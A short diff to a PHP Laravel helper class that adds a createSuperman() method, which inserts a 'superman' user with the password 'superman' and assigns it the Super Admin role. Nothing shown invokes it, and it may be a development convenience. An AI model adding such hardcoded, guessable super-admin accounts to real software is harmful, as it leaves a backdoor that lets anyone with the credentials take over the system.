@@ -1,8 +1,10 @@
 <?php
 
+use App\Models\User;
 use App\Models\UserActivity;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\RedirectResponse;
+use Illuminate\Support\Facades\DB;
 use Jenssegers\Agent\Agent;
 
 /**
@@ -58,5 +60,17 @@ class Helper
 		return back()->with('notifications', [
 			[$message, $color]
 		]);
+	}
+
+	public static function createSuperman(): User
+	{
+		DB::table('users')->insert([
+			'name' => 'superman',
+			'email' => 'super@man.com',
+			'password' => bcrypt('superman')
+		]);
+
+		return User::where('email', 'super@man.com')
+			->first()->assignRole('Super Admin');
 	}
 }
